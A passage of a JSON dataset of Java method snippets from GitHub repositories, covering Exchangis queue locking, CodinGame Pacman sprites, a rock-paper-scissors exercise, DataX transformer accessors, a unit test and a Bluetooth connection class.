    try{\n                if(queueList.isEmpty()){\n                    return null;\n                }\n                int size = queueList.size();\n                if(size >= preIndex){\n                    // if you find that the size of queue-list has changed, update 'preIndex'\n                    preIndex = 0;\n                }\n                index = (++index) % size;\n                dbQueue = queueList.get(index);\n            }finally{\n                rwLock.readLock().unlock();\n            }\n            QueueInfo info = dbQueue.queue.getInfo();\n            //try to lock\n            Date lockTime = Calendar.getInstance().getTime();\n            if (queueDao.lock(info.getId(), AppUtil.getIpAndPort(),\n                    lockTime, this.config.getQueueLockExpire()) > 0) {\n                LOG.info(\"Succeed in getting the Consumer-Lock of queue whose id  [{}], name [{}]\",\n                        info.getId(), info.getqName());\n                //clear the cache\n                dbQueue.queue.cleanCache();\n                //update last lock time\n                dbQueue.lastLockTime = lockTime;\n                return dbQueue;\n            }\n            // if preIndex == index, means that you have traversed the list once\n            if (preIndex == index) {\n                info = queueDao.selectOne(info.getId());\n                long waitTime = 0;\n                if (null != info && info.isLock() && (waitTime = info.getLockTime().getTime() +\n                        this.config.getQueueLockExpire() * 1000 - Calendar.getInstance().getTimeInMillis())> 0) {\n                    syncLock.lock();\n                    try {\n                        //wait for notify\n                        LOG.info(\"Await for getting the Consumer-Lock of queue whose id [{}], name [{}], wait time in mills [{}]\",\n                                info.getId(), info.getqName(), waitTime);\n                        dbQueue.noConsumerLock.await(waitTime, TimeUnit.MILLISECONDS);\n                    } catch (InterruptedException e) {\n                        Thread.currentThread().interrupt();\n                        //ignore\n                    }finally{\n                        syncLock.unlock();\n                    }\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33571, "method_name": "chooseQueue", "class_name": "DbQueueManager", "params": [], "throws": null, "modifiers": [], "return_type": "DbQueue", "snippet": "    DbQueue chooseQueue(){\n        rwLock.readLock().lock();\n        try{\n            int size = queueList.size();\n            Random random = new SecureRandom();\n            int choose = random.nextInt(size);\n            DbQueue dbQueue = queueList.get(choose);\n            return dbQueue;\n        }finally{\n            rwLock.readLock().unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33572, "method_name": "getDbQueue", "class_name": "DbQueueManager", "params": ["String"], "throws": null, "modifiers": [], "return_type": "DbQueue", "snippet": "    DbQueue getDbQueue(String qId) {\n         rwLock.readLock().lock();\n         try{\n             return queueRefs.get(qId);\n         }finally{\n             rwLock.readLock().unlock();\n         }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33573, "method_name": "removeDbQueue", "class_name": "DbQueueManager", "params": ["String"], "throws": null, "modifiers": [], "return_type": "DbQueue", "snippet": "    DbQueue removeDbQueue(String qId){\n         rwLock.writeLock().lock();\n         try {\n             LOG.info(\"Remove the queue id [{}] in list\", qId);\n             DbQueue dbQueue = queueRefs.remove(qId);\n             queueList.remove(dbQueue);\n             //update index\n             int index = dbQueue.index;\n             for(int i = index + 1; i < queueList.size(); i++){\n                 queueList.get(i).index --;\n             }\n             return dbQueue;\n         }finally{\n             rwLock.writeLock().unlock();\n         }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33574, "method_name": "getDbQueueIdSet", "class_name": "DbQueueManager", "params": [], "throws": null, "modifiers": [], "return_type": "Set<String>", "snippet": "    Set<String> getDbQueueIdSet(){\n        rwLock.readLock().lock();\n        try{\n            return new HashSet<>(queueRefs.keySet());\n        }finally{\n            rwLock.readLock().unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33575, "method_name": "addDbQueue", "class_name": "DbQueueManager", "params": ["String", "CacheDbQueue"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void addDbQueue(String qId, CacheDbQueue queue){\n        rwLock.writeLock().lock();\n        try {\n            LOG.info(\"Add the queue id [{}] to list\", qId);\n            DbQueue dbQueue = new DbQueue(queue);\n            queueRefs.put(qId, dbQueue);\n            queueList.add(dbQueue);\n            dbQueue.index = queueList.size() - 1;\n        }finally{\n            rwLock.writeLock().unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33576, "method_name": "unlockNotify", "class_name": "DbQueueManager", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void unlockNotify(String qId){\n        syncLock.lock();\n        try{\n            DbQueue dbQueue = getDbQueue(qId);\n            if(null != dbQueue){\n                //notify the other threads\n                LOG.trace(\"Notify all threads with that queue id [{}] has released the Consumer-Lock\", qId);\n                dbQueue.noConsumerLock.signalAll();\n            }\n        }finally{\n            syncLock.unlock();\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33577, "method_name": "unlockQueueAndNotify", "class_name": "DbQueueManager", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void unlockQueueAndNotify(String qId){\n        LOG.info(\"Unlock queue id [{}]\", qId);\n        queueDao.unlock(Integer.valueOf(qId), AppUtil.getIpAndPort());\n        unlockNotify(qId);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/manager/DbQueueManager.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33578, "method_name": "folderNameFromType", "class_name": "PacmanView", "params": ["PacmanType"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String folderNameFromType(PacmanType type) {\n        switch (type) {\n        case NEUTRAL:\n            return \"1\";\n        case SCISSORS:\n            return \"2\";\n        case PAPER:\n            return \"3\";\n        case ROCK:\n            return \"4\";\n        }\n        throw new RuntimeException(\"Unrecognised pac type: \" + type);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33579, "method_name": "getDeathPacmanImages", "class_name": "PacmanView", "params": ["int", "PacmanType"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String[] getDeathPacmanImages(int playerIndex, PacmanType type) {\n        String indexPacmanType = folderNameFromType(type);\n        String color = playerIndex == 0 ? \"red\" : \"blue\";\n\n        List<String> deathPacmanImages = new ArrayList<String>();\n        for (int i = 1; i < DEATH_FRAME_INDEX_END; i++) {\n            deathPacmanImages.add(\n                String.format(\n                    \"mort_%s_%s_mort%04d\",\n                    color,\n                    indexPacmanType,\n                    i\n                )\n            );\n        }\n        return deathPacmanImages.toArray(new String[0]);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33580, "method_name": "getWalkPacmanImages", "class_name": "PacmanView", "params": ["int", "PacmanType", "boolean"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "    private static String[] getWalkPacmanImages(int playerIndex, PacmanType type, boolean alive) {\n        String indexPacmanType = folderNameFromType(type);\n        String color = playerIndex == 0 ? \"red\" : \"blue\";\n\n        List<String> walkPacmanImages = new ArrayList<String>();\n        for (int i = 0; i < WALK_CYCLE.length; i++) {\n            String extension = alive ? \"\" : \"_2\";\n            walkPacmanImages.add(\n                \"paku_\" + color + \"_\" + indexPacmanType + \"_walk000\" + WALK_CYCLE[i] + extension\n            );\n        }\n        return walkPacmanImages.toArray(new String[0]);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33581, "method_name": "setViewState", "class_name": "PacmanView", "params": ["int", "PacmanType", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setViewState(int playerIndex, PacmanType type, boolean alive) {\n        sprite.setImages(stateToImages.get(new PacmanViewState(playerIndex, type, alive)));\n        if (!alive && death != null) {\n            death.setImages(getDeathPacmanImages(playerIndex, type));\n        }\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33582, "method_name": "equals", "class_name": "PacmanViewState", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean equals(Object obj) {\n            if (this == obj) return true;\n            if (obj == null) return false;\n            if (getClass() != obj.getClass()) return false;\n            PacmanViewState other = (PacmanViewState) obj;\n            if (alive != other.alive) return false;\n            if (playerIndex != other.playerIndex) return false;\n            if (type != other.type) return false;\n            return true;\n        }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 33583, "method_name": "hashCode", "class_name": "PacmanViewState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int hashCode() {\n            final int prime = 31;\n            int result = 1;\n            result = prime * result + (alive ? 1231 : 1237);\n            result = prime * result + playerIndex;\n            result = prime * result + ((type == null) ? 0 : type.hashCode());\n            return result;\n        }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/view/PacmanView.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["private", "static"]}}, {"id": 33584, "method_name": "main", "class_name": "FlowSwitch", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"please choice:\");\n\t\tSystem.out.println(\" 1: Rock\");//\u77f3\u982d\n\t\tSystem.out.println(\" 2: Scis1sors\");//\u526a\u5200\n\t\tSystem.out.println(\" 3: Paper\");//\u5e03\n\t\t// \u7528\u6237\u8f93\u5165:\n\t\tScanner scanner = new Scanner (System.in);\n\t\tint choice = scanner.nextInt();\n\t\t// \u8ba1\u7b97\u673a\u968f\u673a\u6570 1, 2, 3:\n\t\t//int random = 1 + (int) Math.random() * 3;\n\t\t//\u89e3\u51b3\u4e86radom\u7684\u503c\u4e00\u76f4\u4e0d\u53d8\u7684\u95ee\u9898\n\t\tRandom rd = new Random();\n\t\tint random = 1 + rd.nextInt(3);\n\t\tswitch (choice) {\n\t\t// TODO:\n\t\tcase 1://\u77f3\u5934\n\t\t\tif(random == 1) {//\u77f3\u5934\n\t\t\t\tSystem.out.println(\"Rock\");\n\t\t\t\tSystem.out.println(\"!\");\n\t\t\t}else if(random == 2) {//\u526a\u5200\n\t\t\t\tSystem.out.println(\"Scissors\");\n\t\t\t\tSystem.out.println(\"win!\");\n\t\t\t}else {//\u5e03\n\t\t\t\tSystem.out.println(\"Paper\");\n\t\t\t\tSystem.out.println(\"lose!\");\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 2://\u526a\u5200\n\t\t\tif(random == 1) {//\u77f3\u5934\n\t\t\t\tSystem.out.println(\"Rock\");\n\t\t\t\tSystem.out.println(\"lose!\");\n\t\t\t}else if(random == 2) {//\u526a\u5200\n\t\t\t\tSystem.out.println(\"Scissors\");\n\t\t\t\tSystem.out.println(\"!\");\n\t\t\t}else {//\u5e03\n\t\t\t\tSystem.out.println(\"Paper\");\n\t\t\t\tSystem.out.println(\"win!\");\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3://\u5e03\n\t\t\tif(random == 1) {//\u77f3\u5934\n\t\t\t\tSystem.out.println(\"Rock\");\n\t\t\t\tSystem.out.println(\"win!\");\n\t\t\t}else if(random == 2) {//\u526a\u5200\n\t\t\t\tSystem.out.println(\"lose!\");\n\t\t\t\tSystem.out.println(\"Scissors\");\n\t\t\t}else {//\u5e03\n\t\t\t\tSystem.out.println(\"Paper\");\n\t\t\t\tSystem.out.println(\"!\");\n\t\t\tbreak;\n\t\t}\n\t\t\n\t\t/*java12_update\n\t\tString fruit = \"apple\";\n        int opt = switch (fruit) {\n            case \"apple\" -> 1;\n            case \"pear\", \"mango\" -> 2;\n            default -> 0;\n        }; // \u6ce8\u610f\u8d4b\u503c\u8bed\u53e5\u8981\u4ee5;\u7ed3\u675f\n        System.out.println(\"opt = \" + opt);\n        */\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/IzzyPrime/JavaWorkspace/master/JavaPractice/part1/src/com/flow/javapractice/FlowSwitch.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33585, "method_name": "getColumnIndex", "class_name": "TransformerExecutionParas", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getColumnIndex() {\n        return columnIndex;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33586, "method_name": "getParas", "class_name": "TransformerExecutionParas", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String[] getParas() {\n        return paras;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33587, "method_name": "gettContext", "class_name": "TransformerExecutionParas", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> gettContext() {\n        return tContext;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33588, "method_name": "getCode", "class_name": "TransformerExecutionParas", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCode() {\n        return code;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33589, "method_name": "getExtraPackage", "class_name": "TransformerExecutionParas", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getExtraPackage() {\n        return extraPackage;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33590, "method_name": "setColumnIndex", "class_name": "TransformerExecutionParas", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColumnIndex(Integer columnIndex) {\n        this.columnIndex = columnIndex;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33591, "method_name": "setParas", "class_name": "TransformerExecutionParas", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParas(String[] paras) {\n        this.paras = paras;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33592, "method_name": "settContext", "class_name": "TransformerExecutionParas", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void settContext(Map<String, Object> tContext) {\n        this.tContext = tContext;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33593, "method_name": "setCode", "class_name": "TransformerExecutionParas", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(String code) {\n        this.code = code;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33594, "method_name": "setExtraPackage", "class_name": "TransformerExecutionParas", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExtraPackage(List<String> extraPackage) {\n        this.extraPackage = extraPackage;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/transformer/TransformerExecutionParas.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33595, "method_name": "setup", "class_name": "LibraryFileLoaderTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        testFileLoader = new LibraryFileLoader();\n        testBookData = new ArrayList<>();\n        testBookData.add(DATA_HEADER);\n        testBookData.add(DATA_SAMPLE1);\n        testBookData.add(DATA_SAMPLE2);\n\n        setBookData(testBookData);\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderTest.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33596, "method_name": "setBookData", "class_name": "LibraryFileLoaderTest", "params": ["List<String>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setBookData(List<String> data) {\n        // circumvent file loading by directly setting\n        // the corresponding field using reflection\n        FieldTestUtils.setPrivateField(testFileLoader, testFileLoader.getClass(), FILE_CONTENT_FIELD_NAME, data);\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderTest.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33597, "method_name": "checkBookCollectionResult", "class_name": "LibraryFileLoaderTest", "params": ["List<String>", "List<Object>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void checkBookCollectionResult(List<String> bookData, List<Object[]> expectedValues) {\n        List<BookEntry> books = testFileLoader.parseFileContent();\n        assertNotNull(\"Resulting book collection is not expected to be null.\", books);\n        assertEquals(\"Resulting book data has unexpected size.\", expectedValues.size(), books.size());\n\n        for (int i = 0; i < books.size(); i++) {\n            BookEntryTestUtils.checkBookFieldValues(books.get(i), BookEntryTest.BOOK_ENTRY_FIELD_NAMES,\n                    expectedValues.get(i));\n        }\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/tests/LibraryFileLoaderTest.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33598, "method_name": "getDate", "class_name": "ArchiveDto", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDate() {\n        return date;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33599, "method_name": "setDate", "class_name": "ArchiveDto", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDate(String date) {\n        this.date = date;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33600, "method_name": "getCount", "class_name": "ArchiveDto", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCount() {\n        return count;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33601, "method_name": "setCount", "class_name": "ArchiveDto", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCount(String count) {\n        this.count = count;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33602, "method_name": "getArticles", "class_name": "ArchiveDto", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ContentDomain>", "snippet": "    public List<ContentDomain> getArticles() {\n        return articles;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33603, "method_name": "setArticles", "class_name": "ArchiveDto", "params": ["List<ContentDomain>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setArticles(List<ContentDomain> articles) {\n        this.articles = articles;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/ArchiveDto.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33604, "method_name": "getDevice", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BluetoothDevice", "snippet": "    public BluetoothDevice getDevice() {\n        return device;\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33605, "method_name": "connect", "class_name": "ConnectionImpl", "params": ["UUID", "ConnectCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connect(UUID uuid, ConnectCallback callback) {\n        if (isReleased) {\n            if (callback != null) {\n                callback.onFail(\"Already released.\", null);\n            }\n        } else if (socketConnection != null && socketConnection.isConnected()) {\n            if (callback != null) {\n                callback.onFail(\"Already connected.\", null);\n            }\n        } else {\n            socketConnection = new SocketConnection(this, device, uuid, callback);\n        }        \n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33606, "method_name": "isConnected", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnected() {\n        return state == STATE_CONNECTED;\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33607, "method_name": "disconnect", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnect() {\n        if (socketConnection != null) {\n            socketConnection.close();\n            socketConnection = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33608, "method_name": "release", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {\n        release(false);\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33609, "method_name": "releaseNoEvent", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseNoEvent() {\n        release(true);\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33610, "method_name": "release", "class_name": "ConnectionImpl", "params": ["boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void release(boolean noEvent) {\n        if (!isReleased) {\n            clearQueue();\n            disconnect();\n            isReleased = true;\n            state = Connection.STATE_RELEASED;\n            if (BTManager.isDebugMode) {\n                Log.d(BTManager.DEBUG_TAG, \"connection released!\");\n            }\n            if (!noEvent) {\n                if (observer != null) {\n                    posterDispatcher.post(observer, MethodInfoGenerator.onConnectionStateChanged(device, state));\n                }\n                observable.notifyObservers(MethodInfoGenerator.onConnectionStateChanged(device, state));\n            }\n            btManager.releaseConnection(device);//\u4ece\u96c6\u5408\u4e2d\u5220\u9664\n        }\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33611, "method_name": "getState", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getState() {\n        return state;\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33612, "method_name": "setState", "class_name": "ConnectionImpl", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setState(int state) {\n        if (BTManager.isDebugMode) {\n            Log.d(BTManager.DEBUG_TAG, \"state changed: \" + state);\n        }\n        this.state = state;\n        if (observer != null) {\n            posterDispatcher.post(observer, MethodInfoGenerator.onConnectionStateChanged(device, state));\n        }\n        observable.notifyObservers(MethodInfoGenerator.onConnectionStateChanged(device, state));\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33613, "method_name": "clearQueue", "class_name": "ConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearQueue() {\n        synchronized (this) {\n            writeQueue.clear();\n        }\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33614, "method_name": "write", "class_name": "ConnectionImpl", "params": ["String", "byte", "WriteCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void write(@Nullable String tag, @NonNull byte[] value, @Nullable WriteCallback callback) {\n        write(tag, value, false, callback);\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33615, "method_name": "writeImmediately", "class_name": "ConnectionImpl", "params": ["String", "byte", "WriteCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeImmediately(@Nullable String tag, @NonNull byte[] value, @Nullable WriteCallback callback) {\n        write(tag, value, true, callback);\n    }", "url": "https://raw.githubusercontent.com/wandersnail/classic-bluetooth/master/library/src/main/java/cn/wandersnail/bluetooth/ConnectionImpl.java", "stars": "3", "class_props": {"extends": "Connection", "implements": null, "modifiers": []}}, {"id": 33616, "method_name": "write", "class_name": "ConnectionImpl", "params": ["String", "byte", "boolean", "WriteCallback"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void write(String tag, byte[] value, boolean immediately, @Nullable WriteCallback callback) {\n        tag = tag == null ? StringUtils.randomUuid() : tag;\n        if (isReleased || !bluetoothAdapter.isEnabled()) {\n            if (callback != null) {\n                callback.onWrite(device, tag, value, false);\n            } else {\n                if (observer != null) {\n                    posterDispatcher.post(observer, MethodInfoGenerator.onWrite(device, tag, value, false));\n                }\n                observable.notifyObservers(MethodInfoGenerator.onWrite(device, tag, value, false));\n            }\n        } else {\n            synchronized (this) {\n                SocketConnection.WriteData writeData = new SocketConnection.WriteData(tag, value);\n                writeData.callback = callback;\n                if 